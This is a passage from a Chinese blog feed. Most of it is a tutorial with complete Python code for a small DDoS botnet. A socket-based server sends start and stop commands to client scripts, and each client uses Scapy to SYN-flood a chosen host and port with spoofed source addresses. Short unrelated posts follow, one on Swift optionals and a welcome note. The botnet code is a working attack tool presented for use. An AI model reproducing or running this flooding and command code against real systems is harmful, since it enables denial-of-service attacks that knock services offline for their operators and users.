class="string">"192.168.50.10"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><h3 id="使用argparse命令行解析模块"><a href="#使用argparse命令行解析模块" class="headerlink" title="使用argparse命令行解析模块"></a>使用argparse命令行解析模块</h3><p>首先，我们需要命令行解析模块，对我们的命令行输入作处理。Scapy原本是一个命令行的模式，但我们不像每次攻击都手动输入一大堆命令吧，使用脚本会更加方便，所以我们需要argparse模块，对我们的命令行输入做处理，然后“发送”到Scapy中。</p><p>由于我们需要的是一对多模式（Server -&gt; Client），首先我们规定好命令行格式：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;</span></span><br></pre></td></tr></table></figure><p>接下来进行使用argparse的训练：<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入argparse模块</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="comment"># 新建一个ArgumentParser对象，description是对命令行解析的一个描述信息，通常在使用-h命令时显示</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">"Process some integers."</span>)</span><br><span class="line"><span class="comment"># 增加一个参数</span></span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>, dest=<span class="string">'port'</span>, type = int, help = <span class="string">'An port number!'</span>)</span><br><span class="line"><span class="comment"># 解析命令行输入</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(<span class="string">"Port: "</span>, args.port)</span><br></pre></td></tr></table></figure><p>实现效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python argparse_test.py -h</span><br><span class="line">usage: argparse_test.py [-h] [-p PORT]</span><br><span class="line"></span><br><span class="line">Process some integers.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -p PORT     An port number!</span><br><span class="line"></span><br><span class="line">$ sudo python argparse_test.py -p 123</span><br><span class="line">Port:  123</span><br></pre></td></tr></table></figure><h3 id="使用socket模块"><a href="#使用socket模块" class="headerlink" title="使用socket模块"></a>使用socket模块</h3><p>使用socket实现网络信息交换，从而实现服务器与客户端的信息通信。<br>使用socket需要指定IP地址、端口号、协议类型。<br>以下为客户端的实现代码： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 创建socket对象，AF_INET表示使用IPV4对象，SOCK_STREAM表示使用的是基于流</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'192.168.43.61'</span>, <span class="number">7786</span>))</span><br></pre></td></tr></table></figure><p>服务端代码：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器地址列表</span></span><br><span class="line">cliList = []</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定IP和端口，0.0.0.0表示绑定到所有的网络地址，但端口需要不被占用</span></span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">7786</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听器，设置最大连接数10</span></span><br><span class="line">s.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环等待新的连接，且将已连接的对象添加到列表中</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接受一个新的连接</span></span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    <span class="comment"># 添加新的连接到列表</span></span><br><span class="line">    cliList.append(sock)</span><br><span class="line">    <span class="comment">## 测试：显示已连接的客户机IP</span></span><br><span class="line">    <span class="keyword">for</span> client_ip <span class="keyword">in</span> cliList:</span><br><span class="line">        print(<span class="string">"Cliend IP: "</span> + str(client_ip))</span><br></pre></td></tr></table></figure><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h3><p>终于到攻击器的具体实现阶段啦，首先我们编写Server端代码。<br>具体的实现思路和流程，都写在代码内的注释中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">socketList = []</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">5. 第五步，实现发送命令的函数</span></span><br><span class="line"><span class="string">便利socketList，将每个socket都调用一次send将命令发送出去</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># def sendCmd(cmd):</span></span><br><span class="line"><span class="comment">#     print("Send command......")</span></span><br><span class="line"><span class="comment">#     for sock in socketList:</span></span><br><span class="line"><span class="comment">#         sock.send(cmd.encode = ('utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    print(<span class="string">"Send command......"</span>)</span><br><span class="line">    <span class="keyword">for</span> sock <span class="keyword">in</span> socketList:</span><br><span class="line">        sock.send(cmd.encode(<span class="string">'UTF-8'</span>))    </span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">4. 第四步,实现等待客户端的函数</span></span><br><span class="line"><span class="string">循环等待客户端连接，并判断socket是否在socketList已存储过，没有则添加</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waitConnect</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock, addr = s.accept()</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">not</span> <span class="keyword">in</span> socketList:</span><br><span class="line">            socketList.append(sock)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步，编写主函数</span></span><br><span class="line"><span class="string">创建socket，绑定所有网络地址和58868端口并开始监听；</span></span><br><span class="line"><span class="string">新开一个线程等待客户端的连接，以免阻塞我们输入命令（注意）</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">58868</span>))</span><br><span class="line">    s.listen(<span class="number">1024</span>)</span><br><span class="line">    t = Thread(target=waitConnect, args = (s, ))</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    将新开的线程中连接进来的socket添加到一个list中</span></span><br><span class="line"><span class="string">    并检查一下socket长度，需要至少一个客户端连接</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">'Wait at least a client connection!'</span>)</span><br><span class="line">    <span class="comment"># 若没有客户端连接，则</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> len(socketList):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'It has been a client connection!'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    3. 第三步</span></span><br><span class="line"><span class="string">    循环等待输入命令，输入后判断是否符合命令格式的基本要求（自己定）</span></span><br><span class="line"><span class="string">    满足，则把命令发送到所有客户端</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">        print(<span class="string">'The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;"'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待输入的命令</span></span><br><span class="line">        cmd_str = input(<span class="string">'Please input command: '</span>)</span><br><span class="line">        <span class="keyword">if</span> len(cmd_str):</span><br><span class="line">            <span class="keyword">if</span> cmd_str[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">                sendCmd(cmd_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>同样，具体的实现思路和流程，都写在代码内的注释中。<br>客户端实现代码如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">isWorking = <span class="literal">False</span></span><br><span class="line">curProcess = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN flood attack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt,dPort)</span>:</span></span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    print(<span class="string">'The syn flood is running!'</span>)</span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>,<span class="number">65535</span>):</span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport=dPort,flags=<span class="string">"S"</span>)</span><br><span class="line">        packet = ipLayer / tcpLayer </span><br><span class="line">        send(packet)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">3. 第三步</span></span><br><span class="line"><span class="string">创建全部变量curProcess，用于判断是否有进程正在发起SYN泛洪攻击</span></span><br><span class="line"><span class="string">循环等待接受命令，接收到的数据类型为byte型，需要对其进行解码，解码后才为字符串</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># Process Command</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdHandle</span><span class="params">(sock, parser)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> curProcess</span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt;= <span class="number">20</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="comment"># 接收到的数据长度为0，则跳过后续内容，重新接收;</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'The data is empty'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收到的数据长度不为0，则判断是否有命令基本格式的特征#，满足则用ArgumentParser对象解析命令</span></span><br><span class="line">        <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Parse Command</span></span><br><span class="line">                options = parser.parse_args(data[<span class="number">1</span>:].split())</span><br><span class="line">                m_host = options.host</span><br><span class="line">                m_port = options.port</span><br><span class="line">                m_cmd = options.cmd</span><br><span class="line"></span><br><span class="line">                <span class="string">'''</span></span><br><span class="line"><span class="string">                4. 第四步</span></span><br><span class="line"><span class="string">                判断命令参数解析后，是start命令还是stop命令</span></span><br><span class="line"><span class="string">                首先，判断当前是否有进程在运行，如果有进程判断进程是否存活</span></span><br><span class="line"><span class="string">                '''</span></span><br><span class="line">                <span class="comment"># DDoS Start Command</span></span><br><span class="line">                <span class="keyword">if</span> m_cmd.lower() == <span class="string">'start'</span>:</span><br><span class="line">                    <span class="comment"># 如果当前有进程正在发起SYN泛洪攻击，我们就先结束这个进程，并清空屏幕，再启动一个进程</span></span><br><span class="line">                    <span class="keyword">if</span> curProcess != <span class="literal">None</span> <span class="keyword">and</span> curProcess.is_alive():</span><br><span class="line">                        <span class="comment"># 结束进程</span></span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        curProcess = <span class="literal">None</span></span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">                    print(<span class="string">'The synFlood is already started'</span>)</span><br><span class="line">                    p = Process(target=synFlood, args=(m_host, m_port))</span><br><span class="line">                    p.start()</span><br><span class="line">                    curProcess = p</span><br><span class="line">                    <span class="comment"># TODO</span></span><br><span class="line">                    count = count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># DDoS Stop Command</span></span><br><span class="line">                <span class="keyword">elif</span> m_cmd.lower() == <span class="string">'stop'</span>:</span><br><span class="line">                    <span class="keyword">if</span> curProcess.is_alive():</span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">'Failed to perform the command!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步  </span></span><br><span class="line"><span class="string">创建ArgumentParser对象，设置好需要解析的命令参数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(<span class="string">'-H'</span>, dest = <span class="string">'host'</span>, type = str)</span><br><span class="line">    p.add_argument(<span class="string">'-p'</span>, dest = <span class="string">'port'</span>, type = int)</span><br><span class="line">    p.add_argument(<span class="string">'-c'</span>, dest = <span class="string">'cmd'</span>, type = str)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    创建socket，连接服务器</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment">## 测试用，连接本地的58868端口</span></span><br><span class="line">        s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">58868</span>))</span><br><span class="line">        print(<span class="string">'To connect server was success!'</span>)</span><br><span class="line">        print(<span class="string">'='</span> * <span class="number">50</span>)</span><br><span class="line">        cmdHandle(s, p)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'The network connected failed!'</span>)</span><br><span class="line">        print(<span class="string">'Please restart the script!'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h2><p>首先，我们规定了命令格式为：<code>#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;</code><br>e.g. <code>#-H 127.0.0.1 -p 8085 -c start</code>， <code> #-H 127.0.0.1 -p 8085 -c stop</code>  </p><p>首先执行server脚本，然后执行client脚本，等待连接，连接成功，即可在server端操控client进行攻击，示例如下：</p><ol><li><p>启动server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_server_v0.1.py</span><br></pre></td></tr></table></figure></li><li><p>启动client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_client_v0.1.py</span><br></pre></td></tr></table></figure></li><li><p>连接成功<br><img src="http://119.3.78.82:8085/uploads/big/a375724463afb7b4eae2b0550a05764f.png" alt="连接成功"></p></li><li><p>进行攻击<br><img src="http://119.3.78.82:8085/uploads/big/6961dee0c77ba3b193f26447e4b7932f.png" alt="进行攻击"></p></li><li><p>停止攻击<br><img src="http://119.3.78.82:8085/uploads/big/b41516447d764d6b43914b984a656792.png" alt="停止攻击"></p></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1]Blog.csdn.net. (2019). 网络篇——七层协议、四层协议、TCP、HTTP、SOCKET、长短连接 - 袁伏彪 —— 共享，共赢 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/bjyfb/article/details/6682913" target="_blank" rel="noopener">https://blog.csdn.net/bjyfb/article/details/6682913</a> [Accessed 25 Oct. 2019].<br>[2]Jb51.net. (2019). Python实现DDoS. [online] Available at: <a href="https://www.jb51.net/article/155870.htm" target="_blank" rel="noopener">https://www.jb51.net/article/155870.htm</a> [Accessed 25 Oct. 2019].<br>[3]Blog.csdn.net. (2019). TCP包的类型 (SYN, FIN, ACK, PSH, RST, URG) - lqglqglqg的专栏 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/lqglqglqg/article/details/48714611" target="_blank" rel="noopener">https://blog.csdn.net/lqglqglqg/article/details/48714611</a> [Accessed 25 Oct. 2019].</p>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re-Writing</title>
      <link href="/2019/10/23/Re-Writing/"/>
      <url>/2019/10/23/Re-Writing/</url>
      
        <content type="html"><![CDATA[<h1 id="开始写作✏️"><a href="#开始写作✏️" class="headerlink" title="开始写作✏️"></a>开始写作✏️</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 108 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome</title>
      <link href="/2019/10/21/Welcome/"/>
      <url>/2019/10/21/Welcome/</url>
      
        <content type="html"><![CDATA[<h1 id="Welcome-to-My-Paper-Blog"><a href="#Welcome-to-My-Paper-Blog" class="headerlink" title="Welcome to My Paper Blog"></a>Welcome to My Paper Blog</h1><p>This blog mainly record my articles about software development and cyber security.<br/></p><p>Welcome!  </p><p>What’ about your life?<br>What’s about the earth?<br>:-)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【Swift】Optionals and Optionals Banding</title>
      <link href="/2019/09/27//articles/2019/09/27/1569575125889.html/"/>
      <url>/2019/09/27//articles/2019/09/27/1569575125889.html/</url>
      
        <content type="html"><![CDATA[<br/>今天学习Swift 的时候，接触到了Optionals（可选项）这个概念，之后进行StringToInt强制类型转换时，被Swift的**加叹号!进行强转**的这个特性逗笑了，哈哈，非常Swift：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let possibleNumber &#x3D; &quot;123&quot;</span><br><span class="line">&#x2F;&#x2F; 不加叹号前，转换后是optionals, 可选项。这是一个十分swift的特性。</span><br><span class="line">let convertedNumber &#x3D; Int(possibleNumber)!</span><br><span class="line">print(convertedNumber)</span><br></pre></td></tr></table></figure>后来才发现，这个!是Swift语言中的隐式展开可选项。学习一门语言，可真得需要耐心，并且要有细心和好奇心🦝，每个语言都有很多值得深入学习的知识。补充一下可选项（Optionals）的知识：<ul><li>什么是可选项？<ul><li>可选项用来<strong>处理可能缺失</strong>的情况，比如String转Int</li><li>情况一：存在一个值（不一定是数字），可以打开optinals去访问。即这个值等于x，你可以通过转化为optionals访问使用。比如在Switch语句中，case后面的值，就是一个可选项，它<strong>可能存在并且等于某个值，也可能不存在</strong></li><li>情况二：这个值不存在。比如，一个String变量中不表示为一个数字，强转后为nil，并且这个String变量无法被部分识别出整型变量，具体如下代码：  <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> possibleNumber2 = <span class="string">"ALL IS STRING"</span></span><br><span class="line"><span class="keyword">let</span> convertedNumber2 = <span class="type">Int</span>(possibleNumber2)</span><br><span class="line"><span class="comment">// 纯String转化为Int即为nil</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Converted Number 2 is \(convertedNumber2)"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> possibleNumber3 = <span class="string">" 2333 NOT ALL IS STRING 2333"</span></span><br><span class="line"><span class="keyword">let</span> convertedNumber3 = <span class="type">Int</span>(possibleNumber3)</span><br><span class="line"><span class="comment">// 无法部分识别String变量中的数字，仍为nil</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Converted Number 3 is \(convertedNumber3)"</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>什么是可选项绑定（Option Binding）？<ul><li>因为可选项是可能有，可能没有的值。在实际应用中，很可能会遇到需要<strong>根据可选项的值是否存在，来进行逻辑判断</strong>的的情况。此时，我们就可以使用可选项绑定（Option Binding）的方法来<strong>获取可选项里面的值</strong>：</li><li>形式：<code>constantName  =  someOptional</code>，顾名思义，就是把Option绑定到一个固定的值</li><li>和 if、while结合使用，可以检查可选项内部的值，并把它赋值给一个变量或常量  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if let constantName &#x3D; someOptional &#123; </span><br><span class="line">  statements </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>什么是隐式展开可选项（Implicitly Unwrapped Optionals）？<ul><li>在有些程序结构中，可选项被设定值之后，就会一直拥有值，继而可以去掉检查的需求，也不必每次访问都进行展开（Unwrapped），因为它可以<strong>安全地确认每次访问的时候都有一个值</strong><ul><li>此时，这种类型的可选项可定义为隐式展开可选项（Implicitly Unwrapped Optionals）</li><li>通过在声明的类型后面添加一个叹号（String!）而非问好（String?）来书写隐式展开可选项。</li><li>隐式展开可选项主要被用在Swift类的初始化进程中，即可选项被定义的时候就能立即确认其中有值的情况下</li><li>eg. 在访问被明确为 String  的可选项展开值时，可选字符串和隐式展开可选字符串的行为区别：<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> possibleString: <span class="type">String?</span> = <span class="string">"An optional string."</span></span><br><span class="line"><span class="keyword">let</span> forcedString: <span class="type">String</span> = possibleString! <span class="comment">// requires an exclamation mark</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> assumedString: <span class="type">String!</span> = <span class="string">"An implicitly unwrapped optional string."</span></span><br><span class="line"><span class="keyword">let</span> implicitString: <span class="type">String</span> = assumedString <span class="comment">// no need for an exclamation mark</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Swift </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GTD&amp;每周书单</title>
      <link href="/2019/09/25//articles/2019/09/25/1569375402685.html/"/>
      <url>/2019/09/25//articles/2019/09/25/1569375402685.html/</url>
      
